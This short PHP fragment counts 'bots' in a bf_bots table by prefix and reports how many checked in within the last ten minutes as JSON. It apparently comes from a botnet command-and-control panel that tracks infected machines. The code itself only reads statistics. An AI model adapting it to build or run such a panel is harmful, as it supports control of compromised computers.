
$live_bot_all = 0;
$count_bot_all = 0;

$bots = array();
$live_bot = array();

$result = $mysqli->query('SELECT DISTINCT(prefix) prefix, COUNT(prefix) count FROM bf_bots WHERE (last_date > \''.(time()-600).'\') GROUP by prefix ORDER by count');

while($row = $result->fetch_object()){
	$live_bot[$row->prefix] = $row->count;
}

$result = $mysqli->query('SELECT DISTINCT(prefix) prefix, COUNT(prefix) count FROM bf_bots GROUP by prefix ORDER by count DESC');

while($row = $result->fetch_object()){
	if(empty($live_bot[$row->prefix]) || $live_bot[$row->prefix] <= 0) {
		$row->live_bot = 0;
	}else{
		$row->live_bot = $live_bot[$row->prefix];
		$live_bot_all += $live_bot[$row->prefix];
	}

	$count_bot_all += $row->count;

	$bots[] = $row;
}

print(json_encode($bots));